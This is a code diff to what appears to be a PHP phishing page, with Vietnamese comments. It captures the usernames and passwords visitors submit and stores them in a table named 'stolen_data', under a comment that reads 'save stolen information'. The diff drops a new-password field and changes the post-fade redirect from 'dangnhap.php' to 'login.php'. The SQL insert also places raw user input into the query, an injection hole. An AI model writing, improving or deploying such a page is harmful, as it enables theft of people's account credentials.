@@ -12,12 +12,11 @@ if ($mysqli->connect_error) {
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
-    $new_password = $_POST['new_password'];
 
     // Lưu thông tin đánh cắp
     $mysqli->query("
-        INSERT INTO stolen_data (username, password, new_password, created_at)
-        VALUES ('$username', '$password', '$new_password', NOW())
+        INSERT INTO stolen_data (username, password, created_at)
+        VALUES ('$username', '$password', NOW())
     ");
 }
 ?>
@@ -67,7 +66,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     document.body.style.opacity = 0;
 
     setTimeout(function() {
-      window.location.href = "dangnhap.php";
+      window.location.href = "login.php";
     }, 500); // sau 0.5 giây (hiệu ứng mờ dần) thì chuyển
   }, 3000); // chờ 3 giây trước khi fade
 </script>
